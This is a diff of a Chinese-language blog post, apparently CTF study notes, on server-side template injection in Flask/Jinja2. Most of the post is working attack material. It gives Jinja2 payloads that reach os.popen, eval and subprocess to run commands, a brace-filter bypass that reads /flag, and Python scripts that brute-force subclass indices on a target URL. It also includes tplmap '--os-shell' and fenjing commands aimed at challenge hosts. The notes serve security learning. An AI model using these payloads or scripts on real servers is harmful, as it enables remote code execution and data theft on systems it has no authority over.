@@ -6,17 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://zhouypeng.github.io">
-  <title>Tag: hexo | zhou</title>
+  <title>模块注入-SSTI | zhou</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="zhou">
-<meta property="og:url" content="https://zhouypeng.github.io/tags/hexo/index.html">
+  <meta name="description" content="SSTI漏洞原理模块引擎模板引擎是一种工具，用于将数据与预定义的模板结合，生成最终的文档，通常是HTML页面或其他文本格式。它们在Web开发中特别常见，用于动态生成页面内容，允许开发者将业务逻辑与界面展示分离，提高代码的可维护性和重用性。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="模块注入-SSTI">
+<meta property="og:url" content="https://zhouypeng.github.io/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5-SSTI/index.html">
 <meta property="og:site_name" content="zhou">
+<meta property="og:description" content="SSTI漏洞原理模块引擎模板引擎是一种工具，用于将数据与预定义的模板结合，生成最终的文档，通常是HTML页面或其他文本格式。它们在Web开发中特别常见，用于动态生成页面内容，允许开发者将业务逻辑与界面展示分离，提高代码的可维护性和重用性。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zhouypeng.github.io/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5-SSTI/SSTI.png">
+<meta property="article:published_time" content="2024-07-27T08:02:18.000Z">
+<meta property="article:modified_time" content="2024-08-05T09:08:35.087Z">
 <meta property="article:author" content="zhoupeng">
+<meta property="article:tag" content="SSTI">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zhouypeng.github.io/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5-SSTI/SSTI.png">
   
     <link rel="alternative" href="/atom.xml" title="zhou" type="application/atom+xml">
   
@@ -232,76 +239,339 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-模块注入-SSTI" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2024" class="archive-year">2024</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/hexo%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA/" class="archive-article-date">
-        <time datetime="2024-04-06T08:17:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-06</time>
-</a>
-
-        </div>
-    	 
+      <header class="article-header">
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/hexo%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA/" target="_blank">hexo上传文件无法显示</a>
   
+    <h1 class="article-title" itemprop="name">
+      模块注入-SSTI
     </h1>
   
 
 
-        <div class="article-info info-on-right">
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5-SSTI/" class="archive-article-date">
+        <time datetime="2024-07-27T08:02:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-27</time>
+</a>
+
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">1.5k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">7分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+ 
+
+	
+		<h3 id="SSTI漏洞原理"><a href="#SSTI漏洞原理" class="headerlink" title="SSTI漏洞原理"></a>SSTI漏洞原理</h3><h4 id="模块引擎"><a href="#模块引擎" class="headerlink" title="模块引擎"></a>模块引擎</h4><p>模板引擎是一种工具，用于将数据与预定义的模板结合，生成最终的文档，通常是HTML页面或其他文本格式。它们在Web开发中特别常见，用于动态生成页面内容，允许开发者将业务逻辑与界面展示分离，提高代码的可维护性和重用性。</p>
+<span id="more"></span>
+
+<p>它将业务代码和逻辑代码完美的分离开来，业务代码（功能性代码）主要负责实现软件的具体业务功能，比如用户管理、订单处理、数据展示等。逻辑代码（非功能性代码）主要负责支持业务代码的运行，例如数据处理、算法实现、安全性检查等。</p>
+<h4 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h4><p>SSTI漏洞通常发生在服务器端模板引擎处理用户输入时，如果不正确地将用户输入作为模板语言的一部分进行解析和执行，就可能导致恶意用户能够注入并执行任意的模板代码。</p>
+<p>典型的SSTI漏洞利用步骤如下：</p>
+<ul>
+<li><strong>用户输入注入</strong>：攻击者通过Web应用程序的输入点（例如表单字段、URL参数等）注入包含模板引擎特定语法的恶意代码。这些代码将被服务端误认为是普通的模板语言，从而被解析和执行。</li>
+<li><strong>模板代码执行</strong>：一旦恶意代码被注入并解析执行，攻击者可以利用模板引擎的功能执行任意的服务器端代码。这包括调用系统命令、读取敏感文件、修改系统配置等操作。</li>
+<li><strong>攻击向量</strong>：攻击者通常利用Python、Ruby、Java等流行语言的模板引擎特定的类和方法来执行代码，例如Python中常见的<code>__class__</code>、<code>__mro__</code>、<code>__subclasses__()</code>等来构造恶意操作，如文件读取、远程命令执行等。</li>
+</ul>
+<p><img src="/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5-SSTI/SSTI.png"></p>
+<h3 id="具体漏洞"><a href="#具体漏洞" class="headerlink" title="具体漏洞"></a>具体漏洞</h3><h4 id="Python-Flask-SSTI"><a href="#Python-Flask-SSTI" class="headerlink" title="Python_Flask_SSTI"></a>Python_Flask_SSTI</h4><h5 id="python-继承关系和魔术方法"><a href="#python-继承关系和魔术方法" class="headerlink" title="python 继承关系和魔术方法"></a>python 继承关系和魔术方法</h5><h6 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h6><p>父类和子类，子类调用父类下的其他子类</p>
+<p>Python flask脚本没有办法直接执行python指令</p>
+<h6 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__class__</span> #查找当前类型所属对象</span><br><span class="line"><span class="selector-tag">__base__</span> #沿着父子类的关系往上走一个</span><br><span class="line"><span class="selector-tag">__mro__</span> #查找当前类对象的所有继承类</span><br><span class="line"><span class="selector-tag">__subclasses__</span>() #查找父类下的所有子类</span><br><span class="line"><span class="selector-tag">__init__</span> #查看类是否重载</span><br><span class="line"><span class="selector-tag">__globals__</span></span><br></pre></td></tr></table></figure>
+
+<p>演示</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://123.60.1.156:10000/flaskBasedTests/jinja2/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;<span class="selector-class">.__class__</span><span class="selector-class">.__base__</span><span class="selector-class">.__subclasses__</span>()<span class="selector-attr">[117]</span>&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;<span class="selector-class">.__class__</span><span class="selector-class">.__base__</span><span class="selector-class">.__subclasses__</span>()<span class="selector-attr">[117]</span><span class="selector-class">.__init__</span>&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;<span class="selector-class">.__class__</span><span class="selector-class">.__base__</span><span class="selector-class">.__subclasses__</span>()<span class="selector-attr">[117]</span><span class="selector-class">.__init__</span><span class="selector-class">.__globals__</span>&#125;&#125;</span><br><span class="line">#有现成的</span><br><span class="line">&#123;&#123;&#x27;&#x27;<span class="selector-class">.__class__</span><span class="selector-class">.__base__</span><span class="selector-class">.__subclasses__</span>()<span class="selector-attr">[117]</span><span class="selector-class">.__init__</span><span class="selector-class">.__globals__</span><span class="selector-attr">[<span class="string">&#x27;popen&#x27;</span>]</span>(<span class="string">&quot;ls&quot;</span>)<span class="selector-class">.read</span>()&#125;&#125;</span><br><span class="line">#没现成的</span><br><span class="line">&#123;&#123;&#x27;&#x27;<span class="selector-class">.__class__</span><span class="selector-class">.__base__</span><span class="selector-class">.__subclasses__</span>()<span class="selector-attr">[117]</span><span class="selector-class">.__init__</span><span class="selector-class">.__globals__</span><span class="selector-attr">[<span class="string">&#x27;__builtins__&#x27;</span>]</span><span class="selector-attr">[<span class="string">&#x27;eval&#x27;</span>]</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="SSTI常用的注入模块"><a href="#SSTI常用的注入模块" class="headerlink" title="SSTI常用的注入模块"></a>SSTI常用的注入模块</h5><h6 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h6><p>查找子类__frozen_importlib_external.FileLoader——FileLoader利用<a href="0,%22/etc/passwd%22">‘get_data’</a></p>
+<p>Python脚本</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">requests</span></span><br><span class="line"><span class="selector-tag">url</span> = <span class="selector-tag">input</span>(<span class="string">&quot;请输入URL链接：&quot;</span>)</span><br><span class="line"><span class="selector-tag">for</span> <span class="selector-tag">i</span> <span class="selector-tag">in</span> <span class="selector-tag">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="selector-tag">data</span> = &#123;&quot;<span class="selector-tag">name</span>&quot;:&quot;&#123;&#123;()<span class="selector-class">.__class__</span><span class="selector-class">.__base__</span><span class="selector-class">.__subclasses__</span>()<span class="selector-attr">[<span class="string">&quot;+str(i)+&quot;</span>]</span>&#125;&#125;&quot;&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            if &#x27;_frozen_importlib_external.FileLoader&#x27; in response.text:</span><br><span class="line">                print(i)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
+
+<h6 id="内建函数eval执行命令"><a href="#内建函数eval执行命令" class="headerlink" title="内建函数eval执行命令"></a>内建函数eval执行命令</h6><p>利用eval函数写入(‘<strong>import</strong>(“os”).popen(“命令”).read()’)执行命令</p>
+<p>Python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&quot;请输入URL链接：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="os模块执行命令"><a href="#os模块执行命令" class="headerlink" title="os模块执行命令"></a>os模块执行命令</h6><p>在其他函数中直接调用os模块</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="selector-tag">self</span><span class="selector-class">.__dict__</span><span class="selector-class">._TemplateReference__context</span><span class="selector-class">.keys</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line"># 常见可以调用<span class="selector-tag">os</span>的<span class="selector-tag">lipsum</span>、<span class="selector-tag">config</span>、<span class="selector-tag">url_for</span></span><br><span class="line"></span><br><span class="line"># 通过<span class="selector-tag">config</span>调用<span class="selector-tag">os</span></span><br><span class="line">&#123;&#123;<span class="selector-tag">config</span><span class="selector-class">.__class__</span><span class="selector-class">.__init__</span><span class="selector-class">.__globals__</span><span class="selector-attr">[<span class="string">&#x27;os&#x27;</span>]</span><span class="selector-class">.popen</span>(<span class="string">&#x27;whoami&#x27;</span>)<span class="selector-class">.read</span>()&#125;&#125;</span><br><span class="line"></span><br><span class="line"># 通过<span class="selector-tag">url_for</span>调用<span class="selector-tag">os</span></span><br><span class="line">&#123;&#123;<span class="selector-tag">url_for</span><span class="selector-class">.__globals__</span><span class="selector-class">.os</span><span class="selector-class">.popen</span>(<span class="string">&quot;whoami&quot;</span>)<span class="selector-class">.read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&quot;请输入URL链接：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.globals__&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;os.py&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p><em><strong>后面几个不常用</strong></em></p>
+<h6 id="importlib类执行命令"><a href="#importlib类执行命令" class="headerlink" title="importlib类执行命令"></a>importlib类执行命令</h6><p>使用load_module加载os</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">69</span>][<span class="string">&quot;load_module&quot;</span>](<span class="string">&#x27;os&#x27;</span>)[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;ls&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&quot;请输入URL链接：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="linecache函数执行命令"><a href="#linecache函数执行命令" class="headerlink" title="linecache函数执行命令"></a>linecache函数执行命令</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;<span class="selector-class">.__class__</span><span class="selector-class">.__base__</span><span class="selector-class">.__subclasses__</span>()<span class="selector-attr">[191]</span><span class="selector-class">.__init__</span><span class="selector-class">.__globals__</span><span class="selector-attr">[<span class="string">&#x27;linecache&#x27;</span>]</span><span class="selector-attr">[<span class="string">&#x27;os&#x27;</span>]</span><span class="selector-class">.popen</span>(<span class="string">&quot;ls&quot;</span>)<span class="selector-class">.read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&quot;请输入URL链接：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.globals__&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;linecache&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="subprocess-Popen类执行命令"><a href="#subprocess-Popen类执行命令" class="headerlink" title="subprocess.Popen类执行命令"></a>subprocess.Popen类执行命令</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;<span class="selector-class">.__class__</span><span class="selector-class">.__base__</span><span class="selector-class">.__subclasses__</span>()<span class="selector-attr">[200]</span>(<span class="string">&quot;ls&quot;</span>,shell=True,stdout=-<span class="number">1</span>)<span class="selector-class">.communicate</span>()<span class="selector-attr">[0]</span><span class="selector-class">.strip</span>()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&quot;请输入URL链接：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;subprocess.Popen&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="绕过过滤双大括号"><a href="#绕过过滤双大括号" class="headerlink" title="绕过过滤双大括号"></a>绕过过滤双大括号</h5><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="selector-tag">if</span>&quot;&quot;<span class="selector-class">.__class__</span>%&#125; <span class="selector-tag">Benben</span>&#123;%<span class="selector-tag">endif</span>%&#125;</span><br><span class="line"># 有<span class="selector-tag">Benben</span>回显说明有内容</span><br><span class="line"></span><br><span class="line"># 通过<span class="selector-tag">print</span>()打印<span class="selector-tag">flag</span></span><br><span class="line">&#123;% <span class="selector-tag">print</span>(<span class="string">&quot;&quot;</span>.__class__.__base__.<span class="built_in">__subclasses__</span>()[<span class="number">117</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;cat /flag&quot;</span>).<span class="built_in">read</span>() ) %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&quot;请输入URL链接：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&#x27;&#123;% if &quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;ls&quot;).read() %&#125;Benben&#123;% endif %&#125;&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Benben&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i,<span class="string">&quot;--&gt;&quot;</span>,data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="无回显SSTI"><a href="#无回显SSTI" class="headerlink" title="无回显SSTI"></a>无回显SSTI</h5><h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><p>通过rce反弹一个shell出来绕过无回显的页面</p>
+<h6 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h6><p>通过requestbin或dnslog的方式将信息传到外界</p>
+<h6 id="纯盲注"><a href="#纯盲注" class="headerlink" title="纯盲注"></a>纯盲注</h6><h3 id="梭哈工具"><a href="#梭哈工具" class="headerlink" title="梭哈工具"></a>梭哈工具</h3><p>kali里&#x2F;root&#x2F;ins-pip2&#x2F;tplmap</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python2</span> <span class="selector-tag">tplmap</span><span class="selector-class">.py</span> <span class="selector-tag">-u</span> <span class="selector-tag">http</span>:<span class="comment">//challs.tfcctf.com:32041/result?username= --os-shell</span></span><br></pre></td></tr></table></figure>
+
+<p>ubuntu里面的fenjing</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">-m</span> <span class="selector-tag">fenjing</span> <span class="selector-tag">scan</span> <span class="selector-tag">--url</span> &#x27;<span class="selector-tag">http</span>:<span class="comment">//node5.anna.nssctf.cn:28120/&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+	
+
+
+
+    
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  
+                </div>
+              </span>
+            </span>
+          </span>
+        </div>
+      </a>
+    </div>
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          zhoupeng
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="https://zhouypeng.github.io/模块注入-SSTI/" title="模块注入-SSTI" target="_blank">https://zhouypeng.github.io/模块注入-SSTI/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">hexo</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">SSTI</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+    
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/hexo//" class="article-tag-list-link color5">hexo</a>
+        			<a href="/categories/webbug//" class="article-tag-list-link color2">webbug</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
+    
 
     
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
